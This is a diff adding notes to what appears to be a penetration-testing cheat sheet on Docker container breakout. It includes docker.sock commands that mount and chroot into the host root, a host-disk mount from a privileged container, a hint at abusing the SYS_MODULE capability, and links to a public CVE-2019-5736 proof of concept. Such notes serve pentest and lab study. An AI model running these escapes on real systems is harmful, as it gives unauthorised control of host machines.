@@ -616,3 +616,17 @@ Break out of docker container<br/>
 If docker.sock is on conatiner , upload static docker binary<br/>
 `./docker -H unix:///var/run/docker.sock images`<br/>
 `./docker -H unix:///var/run/docker.sock run -it -v /:/host/ wordpress chroot /host`<br/>
+
+## Docker Breakout/Exploits
+
+* If we have a privilege docker and we can run command `fdisk -l` and view storage on the machine then we can mount the host file system <br/>
+
+`mount /dev/sda<x> /mnt/host`
+
+* We can look for container capabilites on docker with `capsh --print` and exploit it SYS_MODULE
+
+https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
+
+* There's another exploit realted to docker (CVE-2019-5736)
+
+https://github.com/Frichetten/CVE-2019-5736-PoC
